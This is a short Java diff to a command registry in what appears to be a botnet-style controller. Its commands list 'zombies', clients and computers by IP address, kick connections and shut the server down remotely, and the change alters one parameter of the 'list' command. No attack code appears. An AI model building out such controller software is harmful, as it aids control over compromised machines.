@@ -83,7 +83,7 @@ public class ClientCommands {
 						-1, CommandActions.getKickAction()));
 		commands.putCommand("list",
 				new CommandData("list [zombies|clients|computers]",
-						"Gets the IP addresses of all the given types of computers given connected to the server.", 0,
+						"Gets the IP addresses of all the given types of computers given connected to the server.", 1,
 						CommandActions.getListAction()));
 		commands.putCommand("ks",
 				new CommandData("ks", "Shuts down the server remotely.", 0, CommandActions.getKillServerAction()));
